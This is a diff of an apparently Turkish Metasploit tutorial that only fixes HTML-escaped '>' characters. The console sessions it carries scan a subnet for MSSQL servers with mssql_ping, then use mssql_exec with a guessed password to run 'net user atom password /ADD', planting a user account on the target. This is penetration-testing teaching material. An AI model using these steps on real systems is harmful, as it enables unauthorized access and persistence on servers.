@@ -30,7 +30,7 @@ Aşağıdaki örnekte, öncelikle içinde `mssql` ifadesi geçen modüller aranm
 
 
 ```bash
-msf **&gt;** search mssql
+msf **>** search mssql
 
 Matching Modules
 **================**
@@ -79,8 +79,8 @@ Listelenen modüllerden `auxiliary/scanner/mssql/mssql_ping` isimli modülü kul
 
 
 ```bash
-msf **&gt;** use auxiliary/scanner/mssql/mssql_ping
-msf auxiliary**(**mssql_ping**)** **&gt;** show options
+msf **>** use auxiliary/scanner/mssql/mssql_ping
+msf auxiliary**(**mssql_ping**)** **>** show options
 
 Module options **(**auxiliary/scanner/mssql/mssql_ping**)**:
 
@@ -93,9 +93,9 @@ Module options **(**auxiliary/scanner/mssql/mssql_ping**)**:
    USERNAME             sa               no        The username to authenticate as
    USE_WINDOWS_AUTHENT  false            yes       Use windows authentification **(**requires DOMAIN option set**)**
 
-msf auxiliary**(**mssql_ping**)** **&gt;** set RHOSTS 10.211.55.1/24
-RHOSTS **=&gt;** 10.211.55.1/24
-msf auxiliary**(**mssql_ping**)** **&gt;** exploit
+msf auxiliary**(**mssql_ping**)** **>** set RHOSTS 10.211.55.1/24
+RHOSTS **=>** 10.211.55.1/24
+msf auxiliary**(**mssql_ping**)** **>** exploit
 
 **[*********]** SQL Server information **for **10.211.55.128:
 **[*********]** tcp **=** 1433
@@ -113,14 +113,14 @@ Sonuçta görüldüğü gibi `10.211.55.128` IP adresinde ve 1433 numaralı Port
 
 
 ```bash
-msf auxiliary**(**mssql_login**)** **&gt;** use auxiliary/admin/mssql/mssql_exec
-msf auxiliary**(**mssql_exec**)** **&gt;** show options
+msf auxiliary**(**mssql_login**)** **>** use auxiliary/admin/mssql/mssql_exec
+msf auxiliary**(**mssql_exec**)** **>** show options
 
 Module options **(**auxiliary/admin/mssql/mssql_exec**)**:
 
    Name                 Current Setting                       Required  Description
    ----                 ---------------                       --------  -----------
-   CMD                  cmd.exe /c echo OWNED **&gt;** C:\owned.exe  no        Command to execute
+   CMD                  cmd.exe /c echo OWNED **>** C:\owned.exe  no        Command to execute
    PASSWORD                                                   no        The password **for **the specified username
    RHOST                                                      yes       The target address
    RPORT                1433                                  yes       The target port **(**TCP**)**
@@ -129,13 +129,13 @@ Module options **(**auxiliary/admin/mssql/mssql_exec**)**:
    USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification **(**requires DOMAIN option set**)**
 
 
-msf auxiliary**(**mssql_exec**)** **&gt;** set RHOST 10.211.55.128
-RHOST **=&gt;** 10.211.55.128
-msf auxiliary**(**mssql_exec**)** **&gt;** set MSSQL_PASS password
-MSSQL_PASS **=&gt;** password
-msf auxiliary**(**mssql_exec**)** **&gt;** set CMD net user atom password /ADD
-cmd **=&gt;** net user atom password /ADD
-msf auxiliary**(**mssql_exec**)** **&gt;** exploit
+msf auxiliary**(**mssql_exec**)** **>** set RHOST 10.211.55.128
+RHOST **=>** 10.211.55.128
+msf auxiliary**(**mssql_exec**)** **>** set MSSQL_PASS password
+MSSQL_PASS **=>** password
+msf auxiliary**(**mssql_exec**)** **>** set CMD net user atom password /ADD
+cmd **=>** net user atom password /ADD
+msf auxiliary**(**mssql_exec**)** **>** exploit
 ```
 
 
